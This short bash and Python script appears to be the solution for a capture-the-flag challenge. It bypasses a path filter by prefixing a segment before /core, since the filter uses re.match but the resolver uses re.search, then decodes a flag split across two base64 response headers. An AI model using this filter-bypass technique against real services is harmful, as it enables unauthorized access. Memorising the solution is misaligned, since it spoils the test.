#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"
PORT="${PORT:-8297}"
FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"

python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import base64, sys
from urllib.request import urlopen

host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"

# The filter uses re.match (anchored at start). The resolver uses re.search
# (scans anywhere). Prepending any segment before /core bypasses the filter.
path = "/x/core"
resp = urlopen(base + path, timeout=5)
resp.read()

# The body contains a decoy grant. The real flag is base64-split across
# two response headers that must be decoded and concatenated in order.
part1 = base64.b64decode(resp.headers.get("X-Topic-Part1", "")).decode()
part2 = base64.b64decode(resp.headers.get("X-Topic-Part2", "")).decode()
flag = part1 + part2
print(flag)
PY
